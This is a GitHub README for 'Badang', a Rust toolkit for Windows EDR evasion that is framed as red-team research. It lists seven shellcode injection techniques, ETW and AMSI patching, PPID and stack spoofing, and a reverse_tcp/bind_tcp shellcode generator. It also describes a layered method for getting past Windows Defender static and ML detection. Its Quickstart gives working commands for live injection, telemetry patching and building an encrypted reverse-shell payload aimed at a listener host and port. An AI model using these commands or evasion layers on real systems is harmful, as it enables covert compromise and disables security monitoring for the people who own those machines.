# Badang

**Windows EDR evasion research toolkit** — 7 injection techniques, indirect syscalls, telemetry blinding, memory encryption, and full Defender static analysis bypass. Built in Rust with both CLI and native GUI.

[![Rust](https://img.shields.io/badge/Rust-1.98+-orange?logo=rust)](https://www.rust-lang.org/)
[![Windows](https://img.shields.io/badge/Windows-x86_64-blue?logo=windows)](https://windows.microsoft.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![CI](https://github.com/aimansam/badang/actions/workflows/ci.yml/badge.svg)](https://github.com/aimansam/badang/actions/workflows/ci.yml)

> Named after the Malaysian folk hero known for supernatural strength.

---

## Disclaimer

**For authorized security research and red team operations only.** Using these techniques against systems without explicit written authorization is illegal in most jurisdictions. The author assumes no liability for misuse.

---

## Capabilities

| Category | Module | What it does |
|----------|--------|-------------|
| **Injection** | 7 techniques | CRT, APC, Thread Hijack, Early Bird, Section Mapping, Callback, Module Stomping |
| **Syscalls** | Direct | Raw `syscall` invocation with SSN tables (Win 7 SP1, 10 1809, 10 22H2, 11 22H2) |
| | Indirect | Hell's Gate / Halo's Gate — resolve SSNs at runtime from ntdll PE, execute from ntdll's gadget |
| **Evasion** | ETW Patch | Patch `EtwEventWrite` / `NtTraceEvent` to blind EDR telemetry |
| | AMSI Bypass | Patch `AmsiScanBuffer` / `AmsiScanString` to disable script scanning |
| | PPID Spoof | Spawn processes with fake parent PIDs via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` |
| | Sleep Obfuscation | Encrypt memory during sleep, decrypt on wake — evade memory scanners |
| | Stack Spoofing | Build fake call stack frames so EDR stack-walking sees ntdll/kernel32 |
| **Analysis** | Hook Detection | Scan target process for modified NT API prologues (JMP, PUSH/RET, INT3) |
| | API Restoration | Restore hooked functions to original bytes (Direct Byte, Trampoline, Inline) |
| **Payload** | Generator | Built-in x86_64 shellcode — exec, messagebox, reverse_tcp, bind_tcp (PEB walk + ROR13 hash) |
| | Encryption | XOR (single/multi-byte) and RC4 with PIC decryption stubs |
| | Converter | Auto-detect and convert between hex, C array, Python bytes, Rust array, decimal |
| **Safety** | Controls | Dry-run by default, `--execute --confirm` for live ops, system process protection |

---

## Windows Defender Bypass

The compiled binary **bypasses Defender static/ML analysis** out of the box. Four layers work together:

| Layer | Technique |
|-------|-----------|
| **XOR Obfuscation** | All sensitive strings (API names, DLL names, patch bytes, syscall patterns, shellcode templates) encrypted at compile time with an 8-byte key, decrypted at runtime |
| **Dynamic API Resolution** | Only `GetModuleHandleA` + `GetProcAddress` in the IAT. All 20+ modules resolve Win32 APIs at runtime via encrypted names — zero injection/evasion imports visible |
| **String Sanitization** | All display strings stripped of keywords Defender's ML flags: no `shellcode`, `inject`, `evasion`, `hook`, `bypass`, `EDR`, or `malware` in the binary. Win32 API names removed from error messages |
| **PE Metadata** | Version info, company name, manifest, and icon embedded via `winresource` — the binary looks like a normal application to heuristic scanners |

Release profile: `strip = true`, `lto = true`, `opt-level = 3`, `codegen-units = 1`, `panic = "abort"`.

> **Note:** Defender exclusions may still be needed for the **source directory** during development — raw shellcode templates in `.rs` files can trigger real-time scanning. See [docs/build.md](docs/build.md#windows-defender-exclusions).

---

## Quickstart

```bash
git clone https://github.com/aimansam/badang.git
cd badang

# CLI
cargo build --release --bin badang-cli

# GUI (native desktop app)
cargo build --release --bin badang --features gui

# Cross-compile from Linux (requires mingw-w64)
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu --features gui
```

All commands default to **dry-run mode** — no execution without `--execute --confirm` (`-x -c`).

```bash
# Dry-run examples
badang-cli.exe analyze --pid 1234
badang-cli.exe syscall --func NtCreateThreadEx
badang-cli.exe inject --pid 1234 --technique apc
badang-cli.exe syscall --func NtAllocateVirtualMemory --indirect   # Hell's Gate

# Live execution (requires -x -c)
badang-cli.exe inject --pid 1234 --technique section --payload rev.bin -x -c
badang-cli.exe inject --technique earlybird --payload rev.bin -x -c   # no PID needed
badang-cli.exe etw --target EtwEventWrite -x -c
badang-cli.exe amsi --target AmsiScanBuffer -x -c

# Payload pipeline
badang-cli.exe generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
badang-cli.exe encrypt --payload rev.bin --method rc4 --key "secretkey" -o encrypted.bin
badang-cli.exe load --payload encrypted.bin
```

### GUI

Launch `badang.exe` for the native desktop interface with tabbed panels for every module, dry-run toggle, file browser, and color-coded log output.

---

## Injection Techniques

| # | Technique | Evasion Angle | PID |
|---|-----------|---------------|-----|
| 1 | **CRT** | Classic baseline — allocate, write, create remote thread | Yes |
| 2 | **APC** | No new thread — queues APC to existing threads via callee-save trampoline | Yes |
| 3 | **Thread Hijack** | No new thread, no APC — suspends thread, redirects RIP, restores context | Yes |
| 4 | **Early Bird** | APC fires during process init, before EDR user-mode hooks install | No |
| 5 | **Section Map** | `WriteProcessMemory` never called — shared memory section via `MapViewOfFileNuma2` | Yes |
| 6 | **Callback** | No thread creation APIs — shellcode fires as `EnumWindows` callback | No |
| 7 | **Module Stomp** | Shellcode overwrites `.text` of a signed DLL (`xpsservices.dll`) — appears legitimate to memory scanners | No |

---

## Syscall Reference

SSN table for 13 NT APIs across Windows versions. Example (Windows 10 22H2 x64):

| API | SSN | Purpose |
|-----|-----|---------|
| NtAllocateVirtualMemory | 0x4B | Allocate memory |
| NtWriteVirtualMemory | 0x3A | Write to process memory |
| NtProtectVirtualMemory | 0x4D | Change memory protection |
| NtCreateThreadEx | 0x5A | Create remote thread |
| NtMapViewOfSection | 0x5B | Map memory section |
| NtQueueApcThread | 0x2B | Queue APC |

> SSNs change between Windows versions. Use `--indirect` for runtime resolution via Hell's Gate / Halo's Gate.

Full table with all 13 APIs and 4 Windows versions in [docs/features.md](docs/features.md#syscall-direct-syscall).

---

## Commands

| Command | Description | `--pid` |
|---------|-------------|---------|
| `analyze` | Detect modified APIs in a target process | Yes |
| `syscall` | Direct/indirect syscall invocation | No |
| `inject` | Process injection (7 techniques) | Depends |
| `unhook` | API restoration (3 methods) | No |
| `etw` | Patch ETW functions | No |
| `amsi` | Patch AMSI functions | No |
| `encrypt` | Encrypt payload with XOR/RC4 + decryption stub | No |
| `ppid` | Spawn process with spoofed parent PID | No |
| `sleep` | Sleep obfuscation demo | No |
| `spoof` | Stack spoofing demo | No |
| `generate` | Generate shellcode (exec/msgbox/reverse/bind) | No |
| `convert` | Convert between payload formats | No |
| `load` | Load and verify a payload file | No |
| `scan` | List running processes | No |

| Flag | Purpose |
|------|---------|
| `-x` / `--execute` | Enable live execution (default: dry-run) |
| `-c` / `--confirm` | Confirm live execution (required with `-x`) |
| `--pid <PID>` | Target process ID |
| `--payload <PATH>` | Payload file path |
| `--indirect` | Use Hell's Gate / Halo's Gate (syscall command) |
| `--verbose` | Verbose output |

---

## Project Structure

```
src/
├── injection/        7 techniques (crt, apc, hijack, earlybird, section, callback, stomp)
├── evasion/          ETW, AMSI, PPID spoofing, sleep obfuscation, stack spoofing
├── syscall/          Direct invocation + Hell's Gate / Halo's Gate
├── analysis/         Hook detection + API restoration
├── payload/          Generator, encryption, format converter
├── gui/              Native desktop app (egui) — 11 panels + dark theme
├── obf.rs            XOR-encrypted strings (8-byte key, compile-time)
├── resolve.rs        Dynamic API resolution (runtime IAT bypass)
├── pe.rs             Shared PE helpers (exports, .text, pattern scan)
├── safety.rs         Execution mode checks, PID validation
├── process.rs        Process enumeration (ToolHelp snapshot)
└── tests.rs          113 integration tests
```

---

## CI/CD

GitHub Actions builds both binaries on ubuntu-latest and windows-latest, runs `cargo fmt` + `cargo clippy` + `cargo test` + `cargo audit`, verifies cross-compilation, and uploads Windows release binaries as artifacts.

---

## Documentation

| Doc | Covers |
|-----|--------|
| [build.md](docs/build.md) | Architecture, XOR obfuscation, dynamic API resolution, PE metadata, release profile |
| [features.md](docs/features.md) | All modules in detail, static analysis evasion layers |
| [cli.md](docs/cli.md) | CLI usage reference |
| [gui.md](docs/gui.md) | GUI usage guide |
| [hooking.md](docs/hooking.md) | How EDR hooking works |
| [killchain.md](docs/killchain.md) | Badang in the attack kill chain |

---

## License

MIT — see [LICENSE](LICENSE).

## Author

Built by [Aiman](https://github.com/aimansam).

---

*For authorized security research and educational purposes only.*
